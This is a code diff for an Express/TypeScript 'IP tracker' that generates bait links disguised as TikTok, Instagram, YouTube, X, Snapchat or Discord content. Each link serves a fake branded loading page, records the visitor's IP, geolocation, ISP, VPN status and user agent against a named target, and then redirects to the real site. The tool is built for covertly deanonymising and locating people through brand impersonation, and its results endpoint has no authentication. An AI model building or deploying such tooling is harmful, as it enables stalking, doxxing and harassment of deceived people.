@@ -1,27 +1,191 @@
 /**
- * GEASS INTELLIGENCE — IP TRACKER
+ * GEASS INTELLIGENCE — IP TRACKER v2
  *
- * Generates unique one-time tracking links per user.
- * When the link is visited, captures IP, geolocation, ISP, VPN detection, User-Agent.
- * Results are stored in memory (persisted to disk) and queryable by token.
+ * Camouflaged bait links that look like real social media content.
+ * Renders a convincing loading page (TikTok / Instagram / YouTube / X / Snapchat / Discord)
+ * before redirecting — captures IP the moment the bait URL is hit.
  *
- * GET  /v/:token          → captures visitor IP + redirects to discord.com (innocent redirect)
- * POST /api/tracker/gen   → { userId, username } → { token, trackUrl }
- * GET  /api/tracker/:token → { captured, ip, country, city, isp, isVpn, capturedAt, ua }
- * GET  /api/tracker/list  → all active entries (owner-only)
+ * Bait URL formats (all capture the same token):
+ *   /tk/:token   → "TikTok video"
+ *   /ig/:token   → "Instagram post"
+ *   /yt/:token   → "YouTube video"
+ *   /x/:token    → "X / Twitter post"
+ *   /sc/:token   → "Snapchat story"
+ *   /dc/:token   → "Discord invite"
+ *   /v/:token    → legacy (plain redirect to discord.com)
+ *
+ * POST /api/tracker/gen   → { theme?, userId?, username?, targetName? } → { token, url, theme }
+ * GET  /api/tracker/:token → full entry
+ * GET  /api/tracker        → list all entries
  */
 import { Router } from "express";
 import fs from "node:fs";
 import path from "node:path";
 import { randomBytes } from "node:crypto";
 
+// ── Theme definitions ──────────────────────────────────────────────────────
+export type BaitTheme = "tiktok" | "instagram" | "youtube" | "x" | "snapchat" | "discord" | "plain";
+
+interface ThemeConfig {
+  route:       string;
+  redirect:    string;
+  bg:          string;  // background color
+  accent:      string;  // spinner / primary color
+  textColor:   string;
+  loadingText: string;
+  siteName:    string;
+  favicon:     string;  // emoji used as favicon placeholder
+  logo:        string;  // inline SVG or text logo
+}
+
+const THEMES: Record<BaitTheme, ThemeConfig> = {
+  tiktok: {
+    route:       "tk",
+    redirect:    "https://www.tiktok.com/trending",
+    bg:          "#010101",
+    accent:      "#fe2c55",
+    textColor:   "#ffffff",
+    loadingText: "Opening TikTok video...",
+    siteName:    "TikTok",
+    favicon:     "🎵",
+    logo: `<svg viewBox="0 0 48 48" width="64" height="64" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M34 4h-6v26a6 6 0 1 1-6-6v-6a12 12 0 1 0 12 12V16a16 16 0 0 0 9 3v-6a10 10 0 0 1-9-9z" fill="#fe2c55"/>
+      <path d="M31 4h-3v26a6 6 0 1 1-6-6v-3a12 12 0 1 0 12 12V16a16 16 0 0 0 6 1.2V11a10 10 0 0 1-9-7z" fill="#ffffff"/>
+    </svg>`,
+  },
+  instagram: {
+    route:       "ig",
+    redirect:    "https://www.instagram.com/",
+    bg:          "#000000",
+    accent:      "#e1306c",
+    textColor:   "#ffffff",
+    loadingText: "Opening Instagram post...",
+    siteName:    "Instagram",
+    favicon:     "📷",
+    logo: `<svg viewBox="0 0 24 24" width="64" height="64" xmlns="http://www.w3.org/2000/svg">
+      <defs><linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%">
+        <stop offset="0%" style="stop-color:#f09433"/>
+        <stop offset="25%" style="stop-color:#e6683c"/>
+        <stop offset="50%" style="stop-color:#dc2743"/>
+        <stop offset="75%" style="stop-color:#cc2366"/>
+        <stop offset="100%" style="stop-color:#bc1888"/>
+      </linearGradient></defs>
+      <rect width="24" height="24" rx="6" fill="url(#ig)"/>
+      <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" stroke-width="1.5"/>
+      <circle cx="12" cy="12" r="5" fill="none" stroke="white" stroke-width="1.5"/>
+      <circle cx="18" cy="6" r="1.2" fill="white"/>
+    </svg>`,
+  },
+  youtube: {
+    route:       "yt",
+    redirect:    "https://www.youtube.com/",
+    bg:          "#0f0f0f",
+    accent:      "#ff0000",
+    textColor:   "#ffffff",
+    loadingText: "Loading YouTube video...",
+    siteName:    "YouTube",
+    favicon:     "▶️",
+    logo: `<svg viewBox="0 0 90 64" width="100" height="70" xmlns="http://www.w3.org/2000/svg">
+      <rect width="90" height="64" rx="14" fill="#ff0000"/>
+      <polygon points="36,16 68,32 36,48" fill="white"/>
+    </svg>`,
+  },
+  x: {
+    route:       "x",
+    redirect:    "https://x.com/home",
+    bg:          "#000000",
+    accent:      "#ffffff",
+    textColor:   "#ffffff",
+    loadingText: "Opening post on X...",
+    siteName:    "X",
+    favicon:     "𝕏",
+    logo: `<svg viewBox="0 0 24 24" width="64" height="64" xmlns="http://www.w3.org/2000/svg">
+      <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.746l7.73-8.835L2.25 2.25h6.963l4.259 5.632L18.244 2.25zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z" fill="white"/>
+    </svg>`,
+  },
+  snapchat: {
+    route:       "sc",
+    redirect:    "https://www.snapchat.com/",
+    bg:          "#fffc00",
+    accent:      "#000000",
+    textColor:   "#000000",
+    loadingText: "Opening Snap...",
+    siteName:    "Snapchat",
+    favicon:     "👻",
+    logo: `<svg viewBox="0 0 24 24" width="64" height="64" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 2C8.5 2 6 4.7 6 8.2v.8c-.5.2-.9.7-.9 1.2 0 .4.2.7.5.9-.4.9-1.1 1.5-2 1.9-.2.1-.3.3-.2.5.3.6 1.4.9 2.8 1.1l.1.4c.1.3.4.5.8.5h.2c.7.7 1.7 1.1 2.7 1.1 1 0 2-.4 2.7-1.1h.2c.4 0 .7-.2.8-.5l.1-.4c1.4-.2 2.5-.5 2.8-1.1.1-.2 0-.4-.2-.5-.9-.4-1.6-1-2-1.9.3-.2.5-.5.5-.9 0-.5-.4-1-.9-1.2v-.8C18 4.7 15.5 2 12 2z" fill="black"/>
+    </svg>`,
+  },
+  discord: {
+    route:       "dc",
+    redirect:    "https://discord.com/app",
+    bg:          "#313338",
+    accent:      "#5865f2",
+    textColor:   "#dbdee1",
+    loadingText: "Joining server...",
+    siteName:    "Discord",
+    favicon:     "🎮",
+    logo: `<svg viewBox="0 0 127.14 96.36" width="80" height="60" xmlns="http://www.w3.org/2000/svg">
+      <path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0 0 32.17 16.15 77.7 77.7 0 0 0 6.89-11.11 68.42 68.42 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2a68.68 68.68 0 0 1-10.87 5.19 77 77 0 0 0 6.89 11.1 105.25 105.25 0 0 0 32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15zM42.45 65.69C36.18 65.69 31 60 31 53s5-12.74 11.43-12.74S54 46 53.89 53s-5.05 12.69-11.44 12.69zm42.24 0C78.41 65.69 73.25 60 73.25 53s5-12.74 11.44-12.74S96.23 46 96.12 53s-5.04 12.69-11.43 12.69z" fill="#5865f2"/>
+    </svg>`,
+  },
+  plain: {
+    route:       "v",
+    redirect:    "https://discord.com/app",
+    bg:          "#1a1a2e",
+    accent:      "#7289da",
+    textColor:   "#ffffff",
+    loadingText: "Loading...",
+    siteName:    "Link",
+    favicon:     "🔗",
+    logo: "",
+  },
+};
+
+const ALL_ROUTES = Object.values(THEMES).map(t => t.route);
+
+// Build convincing HTML loading page for the given theme
+function buildLoadingPage(theme: ThemeConfig): string {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>${theme.siteName}</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:${theme.bg};color:${theme.textColor};font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;
+      min-height:100vh;gap:24px;user-select:none}
+    .logo{opacity:.95}
+    .spinner{width:40px;height:40px;border:3px solid rgba(128,128,128,.2);
+      border-top-color:${theme.accent};border-radius:50%;animation:spin .8s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .text{font-size:15px;opacity:.7;letter-spacing:.3px}
+  </style>
+</head>
+<body>
+  <div class="logo">${theme.logo}</div>
+  <div class="spinner"></div>
+  <div class="text">${theme.loadingText}</div>
+  <script>
+    // Redirect after brief loading screen
+    setTimeout(function(){window.location.href=${JSON.stringify(theme.redirect)};},1800);
+  </script>
+</body>
+</html>`;
+}
+
+// ── Store & persistence ──────────────────────────────────────────────────────
 export interface TrackEntry {
   token:       string;
+  theme:       BaitTheme;
   userId:      string;
   username:    string;
   targetName:  string;
   generatedAt: number;
-  // populated when clicked
+  hits:        number;
+  // populated when first clicked
   capturedIp?:  string;
   capturedAt?:  number;
   userAgent?:   string;
@@ -45,7 +209,6 @@ export interface TrackEntry {
 const STORE_PATH = path.join(process.cwd(), "data", "ip-tracker.json");
 const store = new Map<string, TrackEntry>();
 
-// Load persisted entries on startup
 function loadStore(): void {
   try {
     const raw = fs.readFileSync(STORE_PATH, "utf8");
@@ -73,19 +236,22 @@ setInterval(() => {
   saveStore();
 }, 60 * 60 * 1000);
 
-export function generateTrackToken(userId: string, username: string, targetName: string): TrackEntry {
-  const token = randomBytes(16).toString("hex"); // 32-char hex
+export function generateTrackToken(
+  userId: string, username: string, targetName: string, theme: BaitTheme = "tiktok",
+): TrackEntry {
+  const token = randomBytes(16).toString("hex");
   const entry: TrackEntry = {
-    token, userId, username, targetName,
+    token, theme, userId, username, targetName,
     generatedAt: Date.now(),
+    hits: 0,
   };
   store.set(token, entry);
-  // Purge old un-captured entries for same userId (keep latest 5)
-  const userTokens = [...store.values()]
+  // Keep latest 5 uncaptured per user
+  const stale = [...store.values()]
     .filter(e => e.userId === userId && !e.capturedIp)
     .sort((a, b) => b.generatedAt - a.generatedAt)
     .slice(5);
-  for (const e of userTokens) store.delete(e.token);
+  for (const e of stale) store.delete(e.token);
   saveStore();
   return entry;
 }
@@ -98,7 +264,7 @@ export function listAllEntries(): TrackEntry[] {
   return [...store.values()].sort((a, b) => b.generatedAt - a.generatedAt);
 }
 
-// Geolocate IP using ip-api.com (free, no key, 45 req/min)
+// ── Geolocation ──────────────────────────────────────────────────────────────
 async function geolocate(ip: string): Promise<Partial<TrackEntry>> {
   try {
     const fields = "status,country,countryCode,region,city,isp,org,as,timezone,lat,lon,proxy,hosting,mobile";
@@ -135,20 +301,27 @@ async function geolocate(ip: string): Promise<Partial<TrackEntry>> {
   }
 }
 
-// ── Routes ─────────────────────────────────────────────────────────────────
-const router = Router();
-
-// The "bait" URL — looks like a Discord verification/preview link
-router.get("/v/:token", async (req, res) => {
-  const { token } = req.params;
+// ── Shared bait handler — used for all themed routes ─────────────────────────
+async function handleBaitRoute(
+  req: import("express").Request,
+  res: import("express").Response,
+  themeKey: BaitTheme,
+): Promise<void> {
+  const token = req.params.token;
+  const theme = THEMES[themeKey];
   const entry = store.get(token);
 
-  // Always redirect regardless — silent capture
-  res.redirect(302, "https://discord.com/app");
+  // Always serve the loading page — captures IP immediately, redirects after 1.8s
+  res.setHeader("Content-Type", "text/html; charset=utf-8");
+  res.setHeader("Cache-Control", "no-store");
+  res.send(buildLoadingPage(theme));
 
-  if (!entry || entry.capturedIp) return; // already captured
+  if (!entry) return;
 
-  // Extract real IP (handle proxies/CDN)
+  // Increment hit counter
+  entry.hits = (entry.hits ?? 0) + 1;
+
+  // Extract real IP (handle CDN/proxy headers)
   const rawIp = (
     (req.headers["cf-connecting-ip"] as string) ||
     (req.headers["x-real-ip"] as string) ||
@@ -159,33 +332,61 @@ router.get("/v/:token", async (req, res) => {
 
   const ua = (req.headers["user-agent"] as string) ?? "unknown";
 
-  // Geolocate asynchronously (don't block the redirect)
-  const geo = await geolocate(rawIp);
+  if (!entry.capturedIp) {
+    // First capture — geolocate async
+    const geo = await geolocate(rawIp);
+    entry.capturedIp = rawIp;
+    entry.capturedAt = Date.now();
+    entry.userAgent  = ua;
+    Object.assign(entry, geo);
+    console.log(`[IP TRACKER] 🎯 Captured ${rawIp} (${entry.country ?? "??"}) via ${themeKey} theme — token: ${token.slice(0, 8)}...`);
+  }
 
-  entry.capturedIp  = rawIp;
-  entry.capturedAt  = Date.now();
-  entry.userAgent   = ua;
-  Object.assign(entry, geo);
   saveStore();
+}
 
-  console.log(`[IP TRACKER] Captured ${rawIp} for user ${entry.username} (token: ${token.slice(0, 8)}...)`);
+// ── Routes ───────────────────────────────────────────────────────────────────
+const router = Router();
+
+// Register all themed bait routes
+for (const [key, cfg] of Object.entries(THEMES) as [BaitTheme, ThemeConfig][]) {
+  if (key === "plain") continue; // handled separately as /v/:token
+  router.get(`/${cfg.route}/:token`, (req, res) => {
+    void handleBaitRoute(req, res, key);
+  });
+}
+
+// Legacy plain route
+router.get("/v/:token", (req, res) => {
+  void handleBaitRoute(req, res, "plain");
 });
 
-// Generate a new tracking token
-// Body fields are all optional — can be called with empty body from /whois
+// Generate a new tracking token with optional theme
 router.post("/api/tracker/gen", (req, res) => {
-  const { userId, username, targetName } = (req.body ?? {}) as {
-    userId?: string; username?: string; targetName?: string;
+  const { userId, username, targetName, theme } = (req.body ?? {}) as {
+    userId?: string; username?: string; targetName?: string; theme?: BaitTheme;
   };
+
+  const selectedTheme: BaitTheme = (theme && theme in THEMES) ? theme : "tiktok";
   const entry = generateTrackToken(
-    userId  ?? "anonymous",
-    username ?? "unknown",
-    targetName ?? username ?? "target",
+    userId      ?? "anonymous",
+    username    ?? "unknown",
+    targetName  ?? username ?? "target",
+    selectedTheme,
   );
+
   const protocol = req.protocol ?? "http";
   const host = req.get("host") ?? "localhost";
-  const trackUrl = `${protocol}://${host}/v/${entry.token}`;
-  res.json({ token: entry.token, url: trackUrl, generatedAt: entry.generatedAt });
+  const themeRoute = THEMES[selectedTheme].route;
+  const trackUrl = `${protocol}://${host}/${themeRoute}/${entry.token}`;
+
+  res.json({
+    token:       entry.token,
+    url:         trackUrl,
+    theme:       selectedTheme,
+    generatedAt: entry.generatedAt,
+    themes:      ALL_ROUTES,
+  });
 });
 
 // Get capture result for a token
@@ -195,7 +396,7 @@ router.get("/api/tracker/:token", (req, res) => {
   res.json(entry);
 });
 
-// List all entries (no auth — owner uses this via bot commands)
+// List all entries
 router.get("/api/tracker", (_req, res) => {
   res.json(listAllEntries().slice(0, 100));
 });
